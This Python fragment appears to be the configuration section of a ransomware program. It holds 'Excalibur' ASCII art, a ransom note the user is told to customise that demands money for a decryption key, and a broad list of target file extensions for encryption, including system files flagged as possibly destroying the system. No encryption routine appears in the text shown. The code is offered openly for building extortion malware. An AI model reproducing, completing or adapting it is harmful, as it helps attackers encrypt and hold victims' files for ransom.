# Artwork
ascii_art = """
 ________                                __  __  __                           
|        \                              |  \|  \|  \                          
| $$$$$$$$ __    __   _______   ______  | $$ \$$| $$____   __    __   ______  
| $$__    |  \  /  \ /       \ |      \ | $$|  \| $$    \ |  \  |  \ /      \ 
| $$  \    \$$\/  $$|  $$$$$$$  \$$$$$$\| $$| $$| $$$$$$$\| $$  | $$|  $$$$$$\  
| $$$$$     >$$  $$ | $$       /      $$| $$| $$| $$  | $$| $$  | $$| $$   \$$
| $$_____  /  $$$$\ | $$_____ |  $$$$$$$| $$| $$| $$__/ $$| $$__/ $$| $$      
| $$     \|  $$ \$$\ \$$     \ \$$    $$| $$| $$| $$    $$ \$$    $$| $$      
 \$$$$$$$$ \$$   \$$  \$$$$$$$  \$$$$$$$ \$$ \$$ \$$$$$$$   \$$$$$$  \$$                                                                   
                           ___
                          ( ((
                           ) ))
  .::.                    / /(
 'A .-;-.-.-.-.-.-.-.-.-/| ((::::::::::::::::::::::::::::::::::::::::::::::.._
(E ( ( ( ( ( ( ( ( ( ( ( |  ))   -====================================-      _.>
 `S `-;-`-`-`-`-`-`-`-`-\| ((::::::::::::::::::::::::::::::::::::::::::::::''
  `::'                    \ \(
                           ) ))
                          (_((                
"""

# Note to leave in each path, edit this to fit your needs
note = "Whoops! We're so sorry! Your files have been encrypted. And the only way to decrypt" \
       " them is with the key. If you want the key, you must send us moneyz"

# Array of target extensions that we want to encrypt. Might want to comment out the first row.
target_extensions = [
    'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # System files. May destroy system
    'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw',  # Images
    'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff', 'ape',  # Music and sound
    'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',  # Video and movies
    'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',  # Microsoft office
    'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md',  # OpenOffice, Adobe, Latex, Markdown, etc
    'yml', 'yaml', 'json', 'xml', 'csv',  # Structured data
    'db', 'sql', 'dbf', 'mdb', 'iso',  # Databases and disc images
    'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css',  # Web technologies
    'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx',  # C source code
    'java', 'class', 'jar',  # java source code
    'ps', 'bat', 'vb',  # windows based scripts
    'awk', 'sh', 'cgi', 'pl', 'ada', 'swift',  # linux/mac based scripts
    'go', 'py', 'pyc', 'bf', 'coffee',  # other source code files
    'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats
]

